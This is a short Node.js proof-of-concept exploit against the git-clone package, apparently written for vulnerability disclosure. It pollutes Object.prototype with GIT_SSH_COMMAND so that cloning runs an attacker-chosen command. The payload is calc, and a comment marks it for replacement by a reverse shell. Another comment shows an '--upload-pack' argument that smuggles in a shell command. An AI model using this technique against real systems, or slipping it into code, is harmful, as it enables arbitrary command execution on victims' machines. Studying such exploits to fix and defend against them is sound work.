const gitclone = require('git-clone');

// TODO: replace to reverse shell
Object.prototype.GIT_SSH_COMMAND = "calc";
//Object.prototype.git = "calc";  // we can also control a process name

// See another possible injection via options.args = ['--upload-pack=touch /tmp/pwn2']
// https://gist.github.com/lirantal/9441f3a1212728476f7a6caa4acb2ccc

gitclone('git@github.com:user/repo.git', 'tmp')